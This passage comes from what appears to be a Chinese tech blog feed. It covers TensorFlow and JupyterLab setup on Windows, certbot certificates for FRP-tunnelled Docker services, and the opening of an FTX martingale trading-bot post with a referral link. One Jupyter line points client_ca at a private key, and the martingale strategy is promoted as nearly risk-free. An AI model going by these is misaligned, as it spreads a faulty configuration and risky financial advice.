显示源</span>conda config <span class="token parameter variable">--set</span> show_channel_urls <span class="token function">yes</span><span class="token comment"># 删除源路径</span>conda config --remove-key channels <span class="token comment"># （移除所有其他镜像源, 只留默认源）</span>conda config <span class="token parameter variable">--remove</span> channels 指定的URL <span class="token comment"># 删除指定源</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我并没有用 Anaconda 安装依赖，仅创建虚拟环境后用 pip 进行安装</p></blockquote><h2 id="安装-TensorFlow"><a href="#安装-TensorFlow" class="headerlink" title="安装 TensorFlow"></a>安装 TensorFlow</h2><p><a href="https://github.com/tensorflow/tensorflow#install">官方参考文档</a><br><a href="https://docs.anaconda.com/anaconda/user-guide/tasks/tensorflow/">Anaconda 参考文档</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装 GPU 版本, 使用清华源 (仅支持 CPU 的版本 pip install tensorflow-cpu)</span>pip <span class="token function">install</span> tensorflow <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple<span class="token comment"># 基于当前环境创建虚拟环境</span>conda create <span class="token parameter variable">-n</span> tf-gpu-py39<span class="token comment"># 激活虚拟环境</span>conda activate tf-gpu-py39<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在上 <code>pip install</code> 命令上添加 <code>--upgrade</code> 参数可升级 Tensorflow</p></blockquote><h3 id="验证安装成功"><a href="#验证安装成功" class="headerlink" title="验证安装成功:"></a>验证安装成功:</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tftf<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 3</span>hello <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token string">'Hello, TensorFlow!'</span><span class="token punctuation">)</span>hello<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># b'Hello, TensorFlow!'</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装-JupyterLab"><a href="#安装-JupyterLab" class="headerlink" title="安装 JupyterLab"></a>安装 JupyterLab</h2><p><a href="https://jupyter.org/install">官方安装文档</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装 Jupyter Lab</span>pip <span class="token function">install</span> jupyterlab<span class="token comment"># 安装中文包</span>pip <span class="token function">install</span> jupyterlab-language-pack-zh-CN<span class="token comment"># 生成配置文件 (\Users\xx\.jupyter\jupyter_server_config.py)</span>jupyter server --generate-config<span class="token comment"># jupyter notebook --generate-config</span><span class="token comment"># 设置密码 (\Users\xx\.jupyter\jupyter_server_config.json)</span>jupyter server password<span class="token comment"># 编辑设置证书 </span><span class="token comment"># D:\Mega\https证书\crazynft.top\\fullchain1.pem</span><span class="token comment"># D:\Mega\https证书\crazynft.top\\privkey1.pem</span><span class="token function">vim</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>xx<span class="token punctuation">\</span>.jupyter<span class="token punctuation">\</span>jupyter_server_config.py<span class="token comment"># c.ServerApp.allow_remote_access = True # 允许远程登录</span><span class="token comment"># c.ServerApp.ip = '*' # 允许所有 ip 登录</span><span class="token comment"># 浏览器登录时显示的文件目录, 这个很重要, 不然就是jupyter.exe的目录, windows的路径注意双斜杠,否则无效</span><span class="token comment"># c.FileContentsManager.root_dir = 'D:\\TensorFlowNotebook'</span><span class="token comment"># c.ServerApp.certfile = 'D:\\Mega\\https_cert\\xxx.com\\fullchain1.pem' # 设置证书</span><span class="token comment"># c.ServerApp.client_ca = 'D:\\Mega\\https_cert\\xxx.com\\privkey1.pem' # 设置证书私钥</span><span class="token comment"># 运行 Jupyter Lab, 会将启动位置作为基础目录</span>jupyter-lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h3><p>创建 <code>jupyter_start.bat</code> 文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off jupyter-lab --no-browser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建快捷方式到启动菜单</p>]]></content>
      
      
      <categories>
          
          <category> Machine Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> TensorFlow </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 FRP 内网穿透支持 Docker 容器 HTTPS 访问</title>
      <link href="/2022/03/10/frpdockercontainerhttps/"/>
      <url>/2022/03/10/frpdockercontainerhttps/</url>
      
        <content type="html"><![CDATA[<h2 id="创建证书"><a href="#创建证书" class="headerlink" title="创建证书"></a>创建证书</h2><p>这里我们通过 <a href="https://certbot.eff.org/">CertBot</a> 从 <a href="https://letsencrypt.org/zh-cn/getting-started/">Let’s Encrypt</a> 自动生成证书</p><p>在 <a href="https://certbot.eff.org/">CertBot</a> 主页选择网页应用及操作系统后按照其操作步骤执行即可生成对应的证书:</p><blockquote><p>以下命令在宿主机中执行的，尝试过在容器中执行，但是失败了</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> snapd$ <span class="token function">sudo</span> snap <span class="token function">install</span> core<span class="token punctuation">;</span> <span class="token function">sudo</span> snap refresh core$ <span class="token function">sudo</span> snap <span class="token function">install</span> <span class="token parameter variable">--classic</span> certbot$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /snap/bin/certbot /usr/bin/certbot$ <span class="token function">sudo</span> certbot <span class="token parameter variable">--nginx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里报错了，提示没有安装 <code>nginx</code>，安装 nginx</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> nginx <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>80 端口占用，安装 nginx 后无法启动, 关闭占用端口的应用(服务所在容器)后重试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> certbot <span class="token parameter variable">--nginx</span>Saving debug log to /var/log/letsencrypt/letsencrypt.logEnter email address <span class="token punctuation">(</span>used <span class="token keyword">for</span> urgent renewal and security notices<span class="token punctuation">)</span><span class="token punctuation">(</span>Enter <span class="token string">'c'</span> to cancel<span class="token punctuation">)</span>: 输入你的邮箱- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Please <span class="token builtin class-name">read</span> the Terms of Service athttps://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You mustagree <span class="token keyword">in</span> order to register with the ACME server. Do you agree?- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span class="token punctuation">(</span>Y<span class="token punctuation">)</span>es/<span class="token punctuation">(</span>N<span class="token punctuation">)</span>o: y- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Would you be willing, once your first certificate is successfully issued, toshare your email address with the Electronic Frontier Foundation, a foundingpartner of the Let<span class="token string">'s Encrypt project and the non-profit organization thatdevelops Certbot? We'</span>d like to send you email about our work encrypting the web,EFF news, campaigns, and ways to support digital freedom.- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span class="token punctuation">(</span>Y<span class="token punctuation">)</span>es/<span class="token punctuation">(</span>N<span class="token punctuation">)</span>o: yAccount registered.Please enter the domain name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> you would like on your certificate <span class="token punctuation">(</span>comma and/orspace separated<span class="token punctuation">)</span> <span class="token punctuation">(</span>Enter <span class="token string">'c'</span> to cancel<span class="token punctuation">)</span>: 输入你的域名, 多个域名用逗号或空格分隔Requesting a certificate <span class="token keyword">for</span> 你之前输入的域名Successfully received certificate.Certificate is saved at: /etc/letsencrypt/live/你之前输入的域名/fullchain.pemKey is saved at:         /etc/letsencrypt/live/你之前输入的域名/privkey.pemThis certificate expires on 证书过期时间.These files will be updated when the certificate renews.Certbot has <span class="token builtin class-name">set</span> up a scheduled task to automatically renew this certificate <span class="token keyword">in</span> the background.Deploying certificateSuccessfully deployed certificate <span class="token keyword">for</span> 你之前输入的域名 to /etc/nginx/sites-enabled/defaultCongratulations<span class="token operator">!</span> You have successfully enabled HTTPS on https://你之前输入的域名- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -If you like Certbot, please consider supporting our work by:* Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate* Donating to EFF:                    https://eff.org/donate-le- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>证书创建成功后在 <code>/etc/letsencrypt/live/你之前输入的域名</code> 目录下</p><p>由于我们刚刚启动了 nginx 关闭了容器, 所以现在要关闭宿主机的 nginx，并关闭其开机自启动, 然后再启动容器服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> nginx   root      <span class="token number">2933</span>     <span class="token number">1</span>  <span class="token number">0</span> 02:49 ?        00:00:00 nginx: master process /usr/sbin/nginx <span class="token parameter variable">-g</span> daemon on<span class="token punctuation">;</span> master_process on<span class="token punctuation">;</span>$ <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">2933</span>$ <span class="token function">sudo</span> update-rc.d <span class="token parameter variable">-f</span> nginx remove$ <span class="token function">sudo</span> systemctl disable nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="修改-FRP-客户端配置"><a href="#修改-FRP-客户端配置" class="headerlink" title="修改 FRP 客户端配置"></a>修改 FRP 客户端配置</h2><blockquote><p>未修改的配置省略，可以看[<a href="https://blog.crazybunqnq.com/2020/02/29/raspberrypi4b/#FRP-%E9%85%8D%E7%BD%AE]">https://blog.crazybunqnq.com/2020/02/29/raspberrypi4b/#FRP-配置]</a></p></blockquote><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">common</span><span class="token punctuation">]</span></span>略...<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">blog</span><span class="token punctuation">]</span></span><span class="token key attr-name">type</span> <span class="token punctuation">=</span> <span class="token value attr-value">http</span><span class="token key attr-name">local_ip</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的服务ip</span><span class="token key attr-name">local_port</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的服务端口</span><span class="token key attr-name">custom_domains</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的域名</span><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">blog-https</span><span class="token punctuation">]</span></span><span class="token key attr-name">type</span> <span class="token punctuation">=</span> <span class="token value attr-value">https</span><span class="token key attr-name">local_port</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的服务端口</span><span class="token key attr-name">custom_domains</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的域名</span><span class="token key attr-name">plugin</span> <span class="token punctuation">=</span> <span class="token value attr-value">https2http</span><span class="token key attr-name">plugin_local_addr</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的服务ip:你的服务端口</span><span class="token key attr-name">plugin_crt_path</span> <span class="token punctuation">=</span> <span class="token value attr-value">/etc/letsencrypt/live/你之前输入的域名/fullchain.pem</span><span class="token key attr-name">plugin_key_path</span> <span class="token punctuation">=</span> <span class="token value attr-value">/etc/letsencrypt/live/你之前输入的域名/privkey.pem</span><span class="token key attr-name">plugin_host_header_rewrite</span> <span class="token punctuation">=</span> <span class="token value attr-value">你的域名</span><span class="token key attr-name">plugin_header_X-From-Where</span> <span class="token punctuation">=</span> <span class="token value attr-value">frp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改完成后重启 frpc 就生效了</p><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>这种方式有几个缺点:</p><ol><li>生成证书的时候需要停止服务</li><li>访问 http 链接时无法自动跳转到 https 链接</li></ol><p>等我研究出来之后再来优化~</p><h2 id="泛域名"><a href="#泛域名" class="headerlink" title="泛域名"></a>泛域名</h2><blockquote><p>不用停止已启动的服务，也不需要解析好域名</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certbot certonly --preferred-challenges dns <span class="token parameter variable">-d</span> <span class="token string">"*.你的域名"</span> <span class="token parameter variable">-d</span> 你的域名 <span class="token parameter variable">--manual</span>Saving debug log to C:<span class="token punctuation">\</span>Certbot<span class="token punctuation">\</span>log<span class="token punctuation">\</span>letsencrypt.logEnter email address <span class="token punctuation">(</span>used <span class="token keyword">for</span> urgent renewal and security notices<span class="token punctuation">)</span><span class="token punctuation">(</span>Enter <span class="token string">'c'</span> to cancel<span class="token punctuation">)</span>: baobao222222@qq.com- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Please <span class="token builtin class-name">read</span> the Terms of Service athttps://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You mustagree <span class="token keyword">in</span> order to register with the ACME server. Do you agree?- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span class="token punctuation">(</span>Y<span class="token punctuation">)</span>es/<span class="token punctuation">(</span>N<span class="token punctuation">)</span>o: y- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Would you be willing, once your first certificate is successfully issued, toshare your email address with the Electronic Frontier Foundation, a foundingpartner of the Let<span class="token string">'s Encrypt project and the non-profit organization thatdevelops Certbot? We'</span>d like to send you email about our work encrypting the web,EFF news, campaigns, and ways to support digital freedom.- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span class="token punctuation">(</span>Y<span class="token punctuation">)</span>es/<span class="token punctuation">(</span>N<span class="token punctuation">)</span>o: nAccount registered.Requesting a certificate <span class="token keyword">for</span> *.你的域名 and 你的域名- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Please deploy a DNS TXT record under the name:_acme-challenge.你的域名.with the following value:UfoQY6rDagFen4WPPpP4APQQ_-EQwd9AcEIut9agC8E- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Press Enter to Continue- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Please deploy a DNS TXT record under the name:_acme-challenge.你的域名.with the following value:H402Q80jpUb30EEwuTWanv7Pa-cMSoe96ERqQ15_x_A<span class="token punctuation">(</span>This must be <span class="token builtin class-name">set</span> up <span class="token keyword">in</span> addition to the previous challenges<span class="token punctuation">;</span> <span class="token keyword">do</span> not remove,replace, or undo the previous challenge tasks yet. Note that you might beasked to create multiple distinct TXT records with the same name. This ispermitted by DNS standards.<span class="token punctuation">)</span>Before continuing, verify the TXT record has been deployed. Depending on the DNSprovider, this may take some time, from a few seconds to multiple minutes. You cancheck <span class="token keyword">if</span> it has finished deploying with aid of online tools, such as the GoogleAdmin Toolbox: https://toolbox.googleapps.com/apps/dig/<span class="token comment">#TXT/_acme-challenge.你的域名.</span>Look <span class="token keyword">for</span> one or <span class="token function">more</span> bolded line<span class="token punctuation">(</span>s<span class="token punctuation">)</span> below the line <span class="token string">';ANSWER'</span><span class="token builtin class-name">.</span> It should show thevalue<span class="token punctuation">(</span>s<span class="token punctuation">)</span> you've just added.- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -Press Enter to Continue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时按照提示去域名提供商添加域名解析, 这里我们 <code>-d</code> 了两个域名，所以添加两个 <code>TXT</code> 记录:</p><p><img src="/images/_acme-challenge.png" alt="_acme-challenge.png"></p><blockquote><p>解析结果可以在 linux 命令行中执行命令查看:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nslookup</span> <span class="token parameter variable">-type</span><span class="token operator">=</span>txt _acme-challenge.你的域名 <span class="token number">114.114</span>.114.114Server:         <span class="token number">114.114</span>.114.114Address:        <span class="token number">114.114</span>.114.114<span class="token comment">#53</span>Non-authoritative answer:_acme-challenge.你的域名 text <span class="token operator">=</span> <span class="token string">"UfoQY6rDagFen4WPPpP4APQQ_-EQwd9AcEIut9agC8E"</span>_acme-challenge.你的域名 text <span class="token operator">=</span> <span class="token string">"H402Q80jpUb30EEwuTWanv7Pa-cMSoe96ERqQ15_x_A"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>添加完成后等待解析成功后继续在 cerbort 命令中回车进行下一步</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>.Press Enter to ContinueSuccessfully received certificate.Certificate is saved at: C:<span class="token punctuation">\</span>Certbot<span class="token punctuation">\</span>live<span class="token punctuation">\</span>你的域名<span class="token punctuation">\</span>fullchain.pemKey is saved at:         C:<span class="token punctuation">\</span>Certbot<span class="token punctuation">\</span>live<span class="token punctuation">\</span>你的域名<span class="token punctuation">\</span>privkey.pemThis certificate expires on <span class="token number">2022</span>-06-13.These files will be updated when the certificate renews.NEXT STEPS:- This certificate will not be renewed automatically. Autorenewal of <span class="token parameter variable">--manual</span> certificates requires the use of an authentication hook script <span class="token punctuation">(</span>--manual-auth-hook<span class="token punctuation">)</span> but one was not provided. To renew this certificate, repeat this same certbot <span class="token builtin class-name">command</span> before the certificate<span class="token string">'s expiry date.- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -If you like Certbot, please consider supporting our work by: * Donating to ISRG / Let'</span>s Encrypt:   https://letsencrypt.org/donate * Donating to EFF:                    https://eff.org/donate-le- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自动生成-x2F-更新泛域名证书"><a href="#自动生成-x2F-更新泛域名证书" class="headerlink" title="自动生成/更新泛域名证书"></a>自动生成/更新泛域名证书</h3><p>因为上面的生成操作中穿插着域名解析的操作，所以想要自动生成需要设置钩子(hook), 去自动调用域名厂商的域名解析接口，这里我们用的阿里云的域名，所以使用 <a href="https://github.com/tengattack/certbot-dns-aliyun">certbot-dns-aliyun</a> 插件</p><blockquote><p>需要 python</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> certbot-dns-aliyun<span class="token function">sudo</span> snap <span class="token builtin class-name">set</span> certbot trust-plugin-with-root<span class="token operator">=</span>ok<span class="token function">sudo</span> snap connect certbot:plugin certbot-dns-aliyun/snap/bin/certbot plugins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个配置文件，设置你的阿里云 api key:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> /path/to/credentials.ini<span class="token function">chmod</span> <span class="token number">600</span> /path/to/credentials.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">certbot_dns_aliyun:dns_aliyun_access_key</span> <span class="token punctuation">=</span> <span class="token value attr-value">12345678</span><span class="token key attr-name">certbot_dns_aliyun:dns_aliyun_access_key_secret</span> <span class="token punctuation">=</span> <span class="token value attr-value">1234567890abcdef1234567890abcdef</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>自动生成泛域名证书:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/snap/bin/certbot certonly <span class="token parameter variable">-a</span> certbot-dns-aliyun:dns-aliyun --certbot-dns-aliyun:dns-aliyun-credentials /root/credentials.ini <span class="token parameter variable">-d</span> 你的域名 <span class="token parameter variable">-d</span> <span class="token string">"*.你的域名"</span><span class="token comment"># 自动输入 y 并不输入邮箱</span><span class="token builtin class-name">echo</span> y <span class="token operator">|</span> /snap/bin/certbot certonly --register-unsafely-without-email <span class="token parameter variable">-a</span> certbot-dns-aliyun:dns-aliyun --certbot-dns-aliyun:dns-aliyun-credentials /root/credentials.ini <span class="token parameter variable">-d</span> 你的域名 <span class="token parameter variable">-d</span> <span class="token string">"*.你的域名"</span><span class="token comment"># output</span>Saving debug log to /var/log/letsencrypt/letsencrypt.logPlugin legacy name certbot-dns-aliyun:dns-aliyun may be removed <span class="token keyword">in</span> a future version. Please use dns-aliyun instead.Requesting a certificate <span class="token keyword">for</span> 你的域名 and *.你的域名Unsafe permissions on credentials configuration file: /csa/.tmp/credentials.iniWaiting <span class="token number">30</span> seconds <span class="token keyword">for</span> DNS changes to propagateCertbot failed to authenticate some domains <span class="token punctuation">(</span>authenticator: certbot-dns-aliyun:dns-aliyun<span class="token punctuation">)</span>. The Certificate Authority reported these problems:  Domain: 你的域名  Type:   unauthorized  Detail: No TXT record found at _acme-challenge.你的域名  Domain: 你的域名  Type:   unauthorized  Detail: No TXT record found at _acme-challenge.你的域名Hint: The Certificate Authority failed to verify the DNS TXT records created by --certbot-dns-aliyun:dns-aliyun. Ensure the above domains are hosted by this DNS provider, or try increasing --certbot-dns-aliyun:dns-aliyun-propagation-seconds <span class="token punctuation">(</span>currently <span class="token number">30</span> seconds<span class="token punctuation">)</span>.Some challenges have failed.Ask <span class="token keyword">for</span> <span class="token builtin class-name">help</span> or search <span class="token keyword">for</span> solutions at https://community.letsencrypt.org. See the logfile /var/log/letsencrypt/letsencrypt.log or re-run Certbot with <span class="token parameter variable">-v</span> <span class="token keyword">for</span> <span class="token function">more</span> details.root@csaserver:~<span class="token comment"># echo y | certbot certonly --register-unsafely-without-email -a certbot-dns-aliyun:dns-aliyun --certbot-dns-aliyun:dns-aliyun-credentials /csa/.tmp/credentials.ini -d 你的域名 -d "*.你的域名"</span>Saving debug log to /var/log/letsencrypt/letsencrypt.logPlugin legacy name certbot-dns-aliyun:dns-aliyun may be removed <span class="token keyword">in</span> a future version. Please use dns-aliyun instead.Requesting a certificate <span class="token keyword">for</span> 你的域名 and *.你的域名Unsafe permissions on credentials configuration file: /csa/.tmp/credentials.iniWaiting <span class="token number">30</span> seconds <span class="token keyword">for</span> DNS changes to propagateSuccessfully received certificate.Certificate is saved at: /etc/letsencrypt/live/你的域名/fullchain.pemKey is saved at:         /etc/letsencrypt/live/你的域名/privkey.pemThis certificate expires on <span class="token number">2022</span>-06-20.These files will be updated when the certificate renews.Certbot has <span class="token builtin class-name">set</span> up a scheduled task to automatically renew this certificate <span class="token keyword">in</span> the background.- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -If you like Certbot, please consider supporting our work by: * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate * Donating to EFF:                    https://eff.org/donate-le- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动更新泛域名证书:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/snap/bin/certbot renew <span class="token parameter variable">-a</span> certbot-dns-aliyun:dns-aliyun --certbot-dns-aliyun:dns-aliyun-credentials /root/credentials.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FRP </tag>
            
            <tag> 内网穿透 </tag>
            
            <tag> HTTPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTX 量化空间马丁格尔策略</title>
      <link href="/2021/11/05/ftxquantzonemartingale/"/>
      <url>/2021/11/05/ftxquantzonemartingale/</url>
      
        <content type="html"><![CDATA[<p>之前介绍了 FTX 交易所量化空间的功能和函数以及简单的网格策略，这次说下如何利用量化空间创建马丁格尔机器人: 分批买入，一次卖出</p><p>该策略运气好的话，在<strong>最终卖出时，保证期望收益的情况下还能剩下一些币</strong> ^_^</p><p>派网最近出了个新的交易机器人: 马丁格尔机器人，那为啥我不直接用派网机器人呢？</p><p>原因很简单: 派网的<strong>资金利用率低</strong></p><p>例如开一个机器人用到 1000U, 但是没到下限之前，就会有些 U 没有用到，但是被冻结了，尤其是接近上限时，会有很多 U 没有用到但是没法用在别的地方</p><p><img src="/images/FTXCreateStrategy.jpg" alt="创建策略"></p><blockquote><p>使用 <a href="https://twitter.com/FTX_Benson"><strong>Benson Sun</strong></a> 的 <a href="https://ftx.com/#a=BensonTW">推荐码</a> 注册 FTX 账号，<strong>可以获得 <font color="#FF6666">5%</font> 的手续费折扣</strong></p></blockquote><span id="more"></span><h2 id="设定全局变量策略"><a href="#设定全局变量策略" class="headerlink" title="设定全局变量策略"></a>设定全局变量策略</h2><h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p><code>true</code></p><h3 id="执行逻辑-仅设置变量"><a href="#执行逻辑-仅设置变量" class="headerlink" title="执行逻辑-仅设置变量"></a>执行逻辑-仅设置变量</h3><h4 id="设置策略触发价格"><a href="#设置策略触发价格" class="headerlink" title="设置策略触发价格"></a>设置策略触发价格</h4><p><code>girdStartPrice=60</code></p><p>价格低于这个值才正式开始执行整个策略</p><h4 id="补仓次数"><a href="#补仓次数" class="headerlink" title="补仓次数"></a>补仓次数</h4><blockquote><p>不建议补仓太多次</p></blockquote><p><code>coverCount=5</code></p><h4 id="设置买入百分比"><a href="#设置买入百分比" class="headerlink" title="设置买入百分比"></a>设置买入百分比</h4><p><code>buyPercent=0.1</code></p><p>策略开始后，价格每跌多少进行补仓, 这里我设置的每跌 10% 买一次</p><h4 id="设置期望收益百分比"><a href="#设置期望收益百分比" class="headerlink" title="设置期望收益百分比"></a>设置期望收益百分比</h4><p><code>sellPercent=0.5</code></p><p>涨到 <code>持仓均价 * (1 + sellPercent)</code> 时再卖出所有, 这里我设置的涨 50% 全部卖出</p><h4 id="计算最后一次补仓的价格"><a href="#计算最后一次补仓的价格" class="headerlink" title="计算最后一次补仓的价格"></a>计算最后一次补仓的价格</h4><p>通过补仓次数、起始价格和每次买入百分比计算购买下限</p><blockquote><p>该变量不会用到，也就看一下，了解下网格区间，手动算也行: <code>起始价格 * (1 - 买入百分比)^补仓次数</code></p></blockquote><p><code>startPrice=get_variable("girdStartPrice") * (1 - get_variable("buyPercent")) ** get_variable("coverCount")</code></p><h4 id="设置每次买入额"><a href="#设置每次买入额" class="headerlink" title="设置每次买入额"></a>设置每次买入额</h4><p><code>cost=500</code></p><p>我喜欢每次以固定额度买入，有的人喜欢每次买入固定数量，区别不大，逻辑自己稍微调整一下即可</p><h2 id="第一单策略"><a href="#第一单策略" class="headerlink" title="第一单策略"></a>第一单策略</h2><blockquote><p>没有特殊需求的话买入策略可以合并为一个</p></blockquote><h3 id="触发条件-1"><a href="#触发条件-1" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>触发价格不为 0</li><li>购买数量为 0</li><li>当前价格低于<a href="#%E8%AE%BE%E7%BD%AE%E7%AD%96%E7%95%A5%E8%A7%A6%E5%8F%91%E4%BB%B7%E6%A0%BC">网格触发价格</a></li><li>其他你认为合适的触发条件，用来提高收益</li></ul><p><code>get_variable("girdStartPrice") != 0 and get_variable("buyCount") == 0 and price("FTT/USD") &lt; 